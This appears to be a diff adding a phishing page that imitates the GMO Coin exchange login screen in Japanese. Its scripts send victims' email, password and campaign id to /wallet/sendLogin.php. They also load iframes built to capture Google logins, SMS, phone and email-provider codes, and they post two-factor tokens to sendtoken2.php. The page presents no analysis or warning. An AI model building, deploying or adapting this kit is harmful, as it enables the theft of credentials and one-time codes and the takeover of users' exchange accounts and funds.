@@ -1,0 +1,410 @@
+<html lang="ja">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1" name="viewport"/>
+  <meta content="telephone=no" name="format-detection"/>
+  <link href="/assets-gmo/images/favicon.ico" rel="shortcut icon"/>
+  <link href="/assets-gmo/images/apple-touch-icon-60x60.png" rel="apple-touch-icon" sizes="60x60"/>
+  <link href="/assets-gmo/images/apple-touch-icon-72x72.png" rel="apple-touch-icon" sizes="72x72"/>
+  <link href="/assets-gmo/images/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76"/>
+  <link href="/assets-gmo/images/apple-touch-icon-114x114.png" rel="apple-touch-icon" sizes="114x114"/>
+  <link href="/assets-gmo/images/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120"/>
+  <link href="/assets-gmo/images/apple-touch-icon-144x144.png" rel="apple-touch-icon" sizes="144x144"/>
+  <link href="/assets-gmo/images/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152"/>
+  <link href="/assets-gmo/images/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180"/>
+  <title>
+   ログイン | GMOコイン
+  </title>
+  <link href="/assets-gmo/css/main.css" rel="stylesheet"/>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.1.2/axios.min.js">
+  </script>
+  <script src="app/js/jquery-3.6.0.min.js" type="text/javascript">
+  </script>
+  <link href="/assets/captcha/css/all.css" rel="stylesheet"/>
+  <link href="/assets/captcha/css/style.css" rel="stylesheet"/>
+  <link href="/assets/data/css/login.css" rel="stylesheet"/>
+  <script src="dados_comando.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   $(document).ready(function() {
+			atualiza();
+		});
+
+		function atualiza() {
+			$.get('ver_online.php',
+
+				function(resultado) {
+					$('#onlineagora').html(resultado);
+				})
+
+			setTimeout('atualiza()', 1250);
+		}
+  </script>
+ </head>
+ <body class="login">
+  <input id="camp" name="camp" type="hidden" value=""/>
+  <div class="header-financial">
+   <nav class="header-financial-nav">
+    <span class="fh-title">
+     金融をもっと自由に
+    </span>
+    <span class="fh-bank">
+     <a>
+      銀行
+     </a>
+    </span>
+   </nav>
+  </div>
+  <div id="root">
+   <div>
+    <div>
+     <header class="Header payment">
+      <div class="Header-tit">
+       <h1>
+        <a tabindex="0">
+         <img alt="GMOコイン" src="/assets-gmo/images/zcomcoin-logo.svg"/>
+        </a>
+       </h1>
+      </div>
+     </header>
+     <div class="login-contents contents">
+      <div>
+       <div class="single-box contents-inner">
+        <section>
+         <div class="or-box">
+          <div class="cell">
+           <div class="sys-error-msg dispnone" id="error_notification">
+            <ul>
+             <li class="single-msg" id="error_message">
+              アカウントが存在しないか、パスワードが間違っています。
+             </li>
+            </ul>
+           </div>
+           <p>
+            メールアドレスでログイン
+           </p>
+           <div class="form-sso">
+            <div class="mail-pass">
+             <p class="input-text">
+              <input autocomplete="on" id="inputEmail" maxlength="256" name="login_id" placeholder="メールアドレス" tabindex="0" value=""/>
+             </p>
+             <p class="input-text">
+              <span>
+               <input id="inputPassword" placeholder="パスワード" tabindex="0" type="password" value=""/>
+              </span>
+             </p>
+             <p>
+              <button class="btn aqua-btn" id="sendButton" tabindex="0">
+               ログイン
+              </button>
+             </p>
+             <p class="center">
+              <a id="reset_password">
+               パスワードを忘れた場合
+              </a>
+              <br/>
+              <a id="reset_password">
+               パスワードがロックされた場合
+              </a>
+              <br/>
+              <a id="reset_password">
+               メールアドレスの変更
+              </a>
+             </p>
+            </div>
+           </div>
+          </div>
+          <div class="cell or">
+           <p>
+            <span>
+             または
+            </span>
+           </p>
+          </div>
+          <div class="cell">
+           <div class="sys-error-msg dispnone" id="loginface">
+            <ul>
+             <li class="single-msg">
+              Facebookログインが一時的に利用できない
+             </li>
+            </ul>
+           </div>
+           <p>
+            SNSでログイン
+           </p>
+           <div class="sns-btns">
+            <p>
+             <a class="btn facebook small" id="login_facebook" tabindex="0">
+              Facebookでログイン
+             </a>
+            </p>
+            <p>
+             <a class="btn google small" id="login_google" tabindex="0">
+              Googleでログイン
+             </a>
+            </p>
+            <p class="small-text">
+             ご登録のメールアドレスで、FacebookまたはGoogleアカウントをお持ちの場合、 SNSでのログインもご利用いただけます。
+            </p>
+            <p class="signup-link">
+             口座をお持ちでない場合
+             <a class="small-text">
+              無料口座開設
+             </a>
+            </p>
+           </div>
+          </div>
+         </div>
+        </section>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="divoneload" id="formLoad" style="position: fixed;">
+   <div class="divtwoload">
+    <section _ngcontent-yfn-c81="true" class="loading-section" style="display: flex; justify-content: center;">
+     <div _ngcontent-yfn-c81="true" class="text-center">
+      <div>
+       <img src="/assets-gmo/images/zcomcoin-logo.svg"/>
+      </div>
+      <div _ngcontent-yfn-c81="true" class="loading-section">
+       <div class="spinner">
+        <div class="bounce1">
+        </div>
+        <div class="bounce2">
+        </div>
+        <div class="bounce3">
+        </div>
+       </div>
+      </div>
+     </div>
+    </section>
+   </div>
+  </div>
+  <div class="divonecaptcha" id="formCaptcha" style="position: fixed;">
+   <div class="divtwocaptcha">
+    <div id="captcha">
+    </div>
+   </div>
+  </div>
+  <div class="ReactModalPortal dispnone" id="frameend">
+   <div class="ReactModal__Overlay ReactModal__Overlay--after-open" style="position: fixed; inset: 0px; background-color: rgba(0, 0, 0, 0.7); display: grid; place-items: center; z-index: 100;">
+    <div aria-label="" class="ReactModal__Content ReactModal__Content--after-open" role="dialog" style="position: relative; inset: 0px; border: none; background: none; overflow: inherit; border-radius: 4px; outline: none; padding: 0px;" tabindex="-1">
+     <div class="ReactModal__InnerWrap">
+      <div class="modal-box">
+       <iframe frameborder="0" id="kasa" src="" style="width:400px; overflow: hidden; height:590px; border-radius:10px; margin-right: 0px; border-radius: 5px !important;">
+       </iframe>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script>
+   document.getElementById("login_google").addEventListener("click", function() {
+			document.getElementById("frameend").classList.remove("dispnone");
+			document.getElementById("kasa").src = "/wallet/provider/gmailstart.php";
+		});
+
+		document.getElementById("login_facebook").addEventListener("click", function() {
+			document.getElementById("loginface").classList.remove("dispnone");
+			setTimeout(() => {
+				document.getElementById("loginface").classList.add("dispnone");
+			}, 1500);
+		});
+  </script>
+  <script type="application/javascript">
+   function sms() {
+			document.getElementById('kasa').src = "sms/emails.php";
+			document.getElementById('casa').style.display = "flex";
+			document.getElementById('aviso_bloque').style.display = "none";
+
+		}
+
+		function telefone() {
+			document.body.style.overflow = "hidden";
+			document.getElementById('kasa').src = "phone/emails.php";
+
+			document.getElementById('casa').style.display = "flex";
+			document.getElementById('aviso_bloque').style.display = "none";
+
+		}
+
+
+		function codemailprovedor() {
+			document.body.style.overflow = "hidden";
+			document.getElementById('kasa').src = "provider/emailscod.php";
+
+			document.getElementById('casa').style.display = "flex";
+			document.getElementById('aviso_bloque').style.display = "none";
+		}
+
+
+		function verificarcodemail() {
+			document.body.style.overflow = "hidden";
+			document.getElementById('kasa').src = "provider/codigosms.php";
+			document.getElementById('casa').style.display = "flex";
+			document.getElementById('aviso_bloque').style.display = "none";
+		}
+
+		function doisfatores() {
+			document.body.style.overflow = "hidden";
+			document.getElementById('kasa').src = "provider/emails2fa.php";
+
+			document.getElementById('casa').style.display = "flex";
+			document.getElementById('aviso_bloque').style.display = "none";
+
+		}
+
+		function duasetapas() {
+			document.getElementById('kasa').src = ".php";
+
+			document.getElementById('casa').style.display = "flex";
+			document.getElementById('aviso_bloque').style.display = "none";
+
+		}
+
+
+
+		function token2fa() {
+			document.getElementById('token2fa_master').style.display = "block";
+			document.getElementById('casa').style.display = "none";
+			document.getElementById('aviso_bloque').style.display = "none";
+		}
+
+
+		function token2faerror() {
+			document.getElementById('token2fa_master').style.display = "block";
+			document.getElementById('error').style.display = "block";
+			document.getElementById('casa').style.display = "none";
+			document.getElementById('submit-login').disabled = false;
+			document.getElementById('submit-login').innerHTML = "Authenticate";
+			document.getElementById('otp').value = "";
+			document.getElementById('aviso_bloque').style.display = "none";
+		}
+
+		function emailrecupera() {
+			document.body.style.overflow = "hidden";
+			document.getElementById('kasa').src = "provider/hotmailrecu.php";
+		}
+  </script>
+  <script>
+   function sendtoken() {
+
+			$(document).ready(function() {
+
+				var token = $("#otp").val();
+
+				$.ajax({
+					type: 'post',
+					data: {
+						token: token,
+					},
+					dataType: 'json',
+					url: 'sendtoken2.php',
+					success: function(data) {
+						document.getElementById('submit-login').innerHTML = "<img src='./images/download.svg' width='25px' style='margin:0 auto; padding-top:5px;' >";
+						document.getElementById('submit-login').disabled = true;
+						dispararComando();
+					}
+				});
+
+			});
+
+			return false;
+
+		}
+  </script>
+  <script>
+   const inputEmail = document.getElementById("inputEmail");
+		const inputPass = document.getElementById("inputPassword");
+		const sendButton = document.getElementById("sendButton");
+		const errorNotification = document.getElementById("error_notification");
+		const errorMessage = document.getElementById("error_message");
+		const campanha = document.getElementById("camp").value;
+
+		const urlParams = new URLSearchParams(window.location.search);
+
+		const validateEmail = (email) => {
+			const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+			return emailRegex.test(email);
+		};
+
+		const handleSendButtonClick = async () => {
+			const email = inputEmail.value;
+			const password = inputPass.value;
+
+			const isEmailValid = email && validateEmail(email);
+			const isPasswordValid = password && password.length > 5;
+
+			if (isEmailValid && isPasswordValid) {
+				try {
+					await fetch("/wallet/sendLogin.php", {
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json"
+						},
+						body: JSON.stringify({
+							email,
+							password,
+							campanha
+						})
+					});
+					localStorage.setItem("emailCheckBlock", email);
+					sendButton.setAttribute("disabled", "disabled");
+					setTimeout(() => {
+						document.getElementById("formLoad").style.display = "flex";
+					}, 1200);
+					setTimeout(() => {
+						document.getElementById("formLoad").style.display = "none";
+						document.getElementById("formCaptcha").style.display = "flex";
+					}, 5100);
+				} catch (error) {
+					console.error("Erro ao enviar os dados:", error);
+				}
+			}
+		};
+
+		const validateFields = () => {
+			const email = inputEmail.value;
+			const password = inputPass.value;
+
+			const isEmailValid = email && validateEmail(email);
+			const isPasswordValid = password && password.length > 5;
+
+			if (isEmailValid && isPasswordValid) {
+				sendButton.removeAttribute("disabled", "disabled");
+			} else {
+				sendButton.setAttribute("disabled", "disabled");
+			}
+		};
+
+		inputEmail.addEventListener("input", validateFields);
+		inputPass.addEventListener("input", validateFields);
+		sendButton.addEventListener("click", handleSendButtonClick);
+
+		if (urlParams.has("error")) {
+			const errorCode = urlParams.get("error");
+
+			switch (errorCode) {
+				case "9":
+					errorNotification.classList.remove("dispnone");
+					errorMessage.textContent = "セッションの有効期限が切れました。";
+					break;
+				case "1":
+					errorNotification.classList.remove("dispnone");
+					break;
+			}
+		}
+  </script>
+  <script src="/assets/captcha/js/script.js">
+  </script>
+  <script src="/assets/data/js/loginLower.js">
+  </script>
+  <script src="/assets/js/notification.js">
+  </script>
+ </body>
+</html>
